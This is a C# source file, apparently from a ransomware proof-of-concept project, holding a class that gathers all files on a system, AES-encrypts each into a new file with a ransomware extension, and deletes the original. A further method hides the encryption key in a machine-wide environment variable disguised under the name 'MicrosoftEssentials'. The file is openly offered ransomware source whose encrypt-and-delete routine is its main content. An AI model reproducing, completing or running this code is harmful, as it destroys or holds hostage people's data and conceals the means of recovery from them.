using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime;


namespace Ilay_sRanomwarePoc
{
    static class SystemEncryptor
    {
        private static readonly List<string> SystemDataBase;

        static SystemEncryptor()   //importing the database utility
        {
            SystemDataBase = FileHandlingUtilities.GetAllFileSystem();
        }
        public static void EncryptSystem()
        {
            int FailedFiles = 0;
            try
            {
                //iterate each file
                foreach (string File in SystemDataBase)
                {
                    try
                    {
                        Byte[] RawData = FileHandlingUtilities.GetsRawFileContent(File);  //The original file data
                        Byte[] EncryptedData = AesEncryption.EncryptDataStream(RawData);  //The encrypted file data
                        FileHandlingUtilities.CreateFileForEncryption(File, EncryptedData);// creating a new file under <file>.{RansomwareExtension} with encrypted content
                        FileHandlingUtilities.DeleteSourceFile(File);                      //Deleting the original source file

                    }
                    catch
                    {
                        FailedFiles++;
                        Console.WriteLine($"{FailedFiles} Files where failed to get encrypted");
                    }




                }
                Console.WriteLine($"System encryption suceeded-{FailedFiles} where failed to get encrypted");

            }
            catch
            {
                Console.WriteLine("System iteration failed");
            }



        }
        public static void HidEncryptionKey()
        {
            try
            {
                string name = "MicrosoftEssentials";
                string key = AesEncryption.ConvertByteToString(AesEncryption.GetEncryptionPublicKey());
                //hiding key as an environment variable named MicrosoftEssentials
                Environment.SetEnvironmentVariable(name, key, EnvironmentVariableTarget.Machine);
            }
            catch
            {
                Console.WriteLine("An Error while hiding key");

            }


        }
    }
}
